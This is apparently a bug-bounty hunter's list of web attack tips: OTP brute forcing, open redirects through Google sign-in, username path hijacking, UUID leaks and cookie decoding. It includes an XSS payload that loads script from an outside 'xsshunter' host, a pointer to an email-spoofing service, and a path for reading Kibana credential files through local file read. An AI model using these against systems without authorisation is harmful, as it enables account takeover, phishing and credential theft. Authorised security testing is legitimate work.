1.  OTC (one time code bypass) with inverted brute force
	https://infosecwriteups.com/one-time-code-bypass-with-an-inverted-brute-force-attack-7c5a270196d1
	Instead of bruteforcing one 6 digit code, bruteforce the same code for 200k times.
	Request a code for 10 times, randomly select any 5 and use the same code in every other request sents
2. Tamper with every every parameter in every request. (SQL)
3. Use AEM scanner by 0ang3l https://github.com/0ang3el/aem-hacker
4. Reversing a weak email verification algorithm [Writeup](https://infosecwriteups.com/pre-account-takeover-by-reversing-a-weak-email-verification-token-algorithm-ff0617b2365a)
5. Path Hijacking
	1. If account URL is as specified: site.com/username, try to register sensitive paths as username. eg- login, logout, register, support etc.
6. Open redirect in google sign-in. Modify the state parameter in the link of the "Sign in with google" button to some other website.[Writeup](https://infosecwriteups.com/open-redirect-in-target-via-google-sign-in-d42b3cb633d
7. To find UUID of a user, register with their username. Error message ,may contain their UUID
8. I set up a Burp match and replace rule that turns XXX into: `'"><script src="xsshunter url"></script><h1>test` Then I just put 'FooXXX' into everything I see, and see what happens. That'll find most trivial XSS and SQLi. Then I look at file uploads for SSRF and such.
9. Try decoding cookie values https://github.com/iangcarroll/cookiemonster/
10. Use emkei.cz, for email-spoofing
11. If found a LFR and kibana instance, read kibana creds from ' /etc/kibana/kibana.yml'